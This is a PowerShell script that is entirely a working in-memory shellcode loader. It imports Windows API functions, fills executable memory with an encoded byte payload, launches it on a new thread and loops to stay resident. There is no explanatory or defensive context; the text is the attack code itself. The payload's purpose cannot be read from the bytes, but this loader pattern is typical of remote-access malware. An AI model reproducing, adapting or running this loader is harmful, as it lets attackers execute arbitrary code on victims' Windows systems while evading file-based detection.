$abqS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $abqS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xd8,0x6d,0x60,0x70,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x4e,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xdc,0x8f,0x95,0x8c,0x34,0xcd,0x56,0x6d,0xc4,0xb2,0xdf,0x88,0xf5,0xf2,0x84,0xd9,0xa5,0xc2,0xcf,0x8c,0x49,0xa8,0x82,0x24,0xda,0xdc,0x0a,0x4a,0x6b,0x6a,0x6d,0x65,0x6c,0xc7,0x4d,0xe4,0xee,0x1a,0x82,0xc6,0xcf,0xd4,0xd7,0x07,0x08,0x08,0x15,0x55,0xc1,0x46,0x88,0x4a,0x66,0x12,0x11,0xe0,0x34,0xb2,0x11,0x15,0x8c,0xb5,0x30,0x88,0x87,0xef,0x92,0x2a,0x44,0x84,0x9a,0x34,0x89,0xa1,0x55,0xce,0x79,0x5d,0x64,0x06,0xb0,0x9e,0xcb,0x67,0x7d,0x6d,0x15,0xaf,0xb9,0x8e,0x60,0xd9,0xba,0x33,0x73,0x1e,0xc1,0xef,0xf6,0x85,0x61,0x7b,0xa0,0x61,0x90,0xa8,0x37,0xe1,0x9e,0x05,0x33,0xad,0x82,0x98,0x90,0xc5,0xbe,0x11,0x17,0x0a,0x37,0x61,0x3c,0x8e,0x1c,0x31,0x5d,0x97,0xf8,0x94,0x62,0xc7,0xa3,0x49,0xc7,0x83,0x49,0x9d,0x7a,0xce,0x05,0x52,0xb7,0xf1,0xd5,0xfc,0xc0,0x82,0xe7,0xa3,0x7a,0x0d,0x4b,0x2b,0xa5,0xca,0xac,0x06,0x11,0x44,0x53,0xa9,0x62,0x4c,0x97,0xfd,0x32,0xe6,0x3e,0x7e,0xd9,0xf6,0xbf,0xab,0x4e,0xa7,0x6f,0x04,0x2f,0x17,0xcf,0xf4,0xc7,0x7d,0xc0,0x2b,0xf7,0x7d,0x0b,0x44,0x10,0x90,0xb3,0x6b,0xe1,0xf7,0xd7,0x04,0x92,0xc3,0x27,0xeb,0x7a,0x48,0x23,0x65,0xf0,0xbe,0xc5,0x1c,0x82,0xbe,0x71,0x76,0x42,0x8b,0x01,0x77,0x46,0x78,0x41,0x94,0x03,0x7a,0x11,0xcc,0xd1,0x84,0x8e,0x9d,0x5f,0x62,0xda,0x8d,0x09,0x3c,0x72,0x37,0x10,0xb6,0xe3,0xb8,0x8e,0xb2,0x23,0x32,0x3d,0x42,0xed,0xb3,0x48,0x50,0x99,0x33,0x07,0x0a,0x0f,0x4b,0xbd,0x21,0xaf,0xd9,0x3a,0xe0,0xf8,0x75,0x41,0xd5,0xce,0xd9,0xba,0x30,0x45,0xd3,0x2e,0xfb,0x31,0x1c,0xbf,0xfb,0xc1,0x4a,0xd5,0xfb,0xa9,0x2a,0x8d,0xaf,0xcc,0x34,0x18,0xdc,0x5d,0xa1,0xa3,0xb5,0x32,0x62,0xcc,0x3b,0x6d,0x44,0x53,0xc3,0x58,0x54,0xaf,0x12,0xa4,0x22,0xc1,0xa6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ai4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ai4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ai4,0,0,0);for (;;){Start-sleep 60};